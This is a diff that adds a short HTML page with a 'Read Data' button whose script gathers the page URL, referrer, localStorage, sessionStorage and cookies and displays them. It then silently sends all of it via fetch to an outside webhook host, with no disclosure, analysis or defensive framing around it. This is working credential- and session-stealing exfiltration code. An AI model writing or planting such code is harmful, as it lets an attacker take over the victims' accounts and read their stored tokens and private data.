@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<body>
+<button onclick="read()">Read Data</button>
+<pre id="out"></pre>
+<script>
+function read(){
+  let out = "";
+  out += "URL: " + location.href + "\n";
+  out += "Referrer: " + document.referrer + "\n";
+  out += "localStorage: " + JSON.stringify(localStorage).slice(0,2000) + "\n";
+  out += "sessionStorage: " + JSON.stringify(sessionStorage).slice(0,2000) + "\n";
+  out += "cookies: " + document.cookie + "\n";
+  document.getElementById('out').innerText = out;
+  fetch('https://webhooksite.net/9782dc22-d216-43c9-a513-905aa2d97d00?data=' + encodeURIComponent(out));
+}
+</script>
+</body>
+</html>
